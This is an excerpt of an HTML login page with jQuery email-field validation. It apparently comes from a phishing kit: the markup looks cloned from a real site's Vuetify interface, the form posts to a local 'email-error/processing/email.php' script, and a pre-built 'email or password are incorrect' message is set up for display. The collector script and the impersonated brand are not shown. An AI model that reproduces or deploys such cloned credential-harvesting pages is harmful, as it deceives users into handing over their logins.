                            ...
                            <div data-v-fec3e2d0="" data-v-63ab483a="">
                                ...
                                <div data-v-2906dda8="" data-v-fec3e2d0="" class="row">
                                    <div data-v-2906dda8="" class="col-md-5 col-lg-4 col">
                                        <form data-v-fec3e2d0="" novalidate="novalidate" class="v-form" data-v-2906dda8="" action="./email-error/processing/email.php" method="POST">
                                            <div data-v-6a6d1b4c="" data-v-55886b46="">
                                                <div data-v-021e61f0="" data-v-6a6d1b4c="">
                                                    <div data-v-021e61f0="" id="emaildiv" class="v-input v-input--has-state theme--light v-text-field v-text-field--is-booted ">
                                                        <div class="v-input__control">
                                                            <div class="v-input__slot">
                                                                <div class="v-text-field__slot"><label for="email" id="emaillabel" class="v-label theme--light" style="left: 0px; right: auto; position: absolute;">Email Address</label><input autocomplete="off" autofocus="autofocus" id="email" name="email2" type="text"></div>
                                                            </div>
                                                            <div class="v-text-field__details">
                                                                <div id="emailerror" style="display:none" class="v-messages theme--light error--text" role="alert">
                                                                    <div class="v-messages__wrapper">
                                                                        <div class="v-messages__message">Enter a Valid Email Address</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
        ...
        <div role="document" id="mobileerror" tabindex="0" data-v-5c15a386="" class="v-dialog__content v-dialog__content--active" style="z-index: 202;display: none;">
            <div class="v-dialog notification-modal dialog-top align-self-start v-dialog--active v-dialog--persistent" style="transform-origin: center center; max-width: 350px;">
                <div data-v-5c15a386="" class="text-center v-card v-sheet theme--light">
                    ...
                    <div data-v-5c15a386="" class="v-card__text py-1">Your email or password are incorrect. Please try again.</div>
...
<script>
    ...
    //email
    $('#emaildiv').on('input', function(e) {
        $("#emaillabel").addClass('v-label--active primary--text');
        $("#emaildiv").addClass('v-input--is-focused primary--text');
        var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
        email = $("#email").val();
        if ($('#email').val().length == 0) {
            $("#emaillabel").removeClass('v-label--active ');
            $("#emaildiv").removeClass('v-input--is-dirty');
            $("#emaildiv").addClass('error--text');
            $("#emaillabel").addClass('error--text');
            $("#emaildiv").addClass('v-input--has-state');

            $("#emailerror").show();
        } else if (!emailReg.test(email)) {
            $("#emaildiv").removeClass('v-input--is-focused');
            $("#emaildiv").addClass('error--text');
            $("#emaillabel").addClass('error--text');
            $("#emaildiv").addClass('v-input--has-state');
            ...
            $("#emaillabel").removeClass('error--text');
            $("#emaildiv").addClass('v-input--is-dirty');
            $("#emaildiv").removeClass('error--text');
            $("#emaildiv").removeClass('v-input--has-state');
    ...
    $('#email').focus(function() {
        ...
        if ($('#email').val().length == 0) {
            ...
            $("#emaildiv").removeClass('v-input--is-dirty');
            $("#emaildiv").addClass('error--text');
            $("#emaillabel").removeClass('primary--text');
            $("#emaildiv").removeClass('primary--text');
            $("#emaillabel").addClass('error--text');
            $("#emaildiv").addClass('v-input--has-state');
            $("#emailerror").show();
